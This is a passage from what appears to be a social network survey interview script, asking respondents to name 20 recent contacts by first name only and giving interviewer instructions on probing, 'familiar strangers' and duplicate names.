These should be people you have had contact with sometime during the <u>past year or so</u> - either face-to-face, by phone, mail or e-mail. Let&#039;s start by naming the people that are <u>most important to you</u> and then we&#039;ll work outwards toward people who are less important to you. You can name anyone you know no matter who they are or where they live. Please, first names only - we want to protect the confidentiality of those people. We do NOT want to know their last names. You can also say initials or a nickname instead of a first name.\r\n<br /><br />\r\n<i>INTERVIEWER: EACH RESPONDENT MUST NAME A TOTAL OF 20 PEOPLE. PROBE, IF NEEDED. IF R ASKS WHETHER \"FAMILIAR STRANGERS\" (E.G., THE GUY AT THE 7-ELEVEN, THE GIRL AT THE RITE-AID) ARE OK TO NAME, THE ANSWER IS \"YES\" - SO LONG AS THEY KNOW THIS PERSON AND THIS PERSON KNOWS THEM (EVEN IF NOT BY NAME). (OK TO INCLUDE FACEBOOK, MYSPACE, ETC. AS LONG AS OTHER CRITERIA ARE MET.) IF TWO ALTERS HAVE THE SAME FIRST NAME, ASK FOR INITIALS OR A NICKNAME.</i>\r\n<br /><br />\r\nLooking at the 20 people on your list, I want to get a better sense of who these people are and the role that they play in your life.
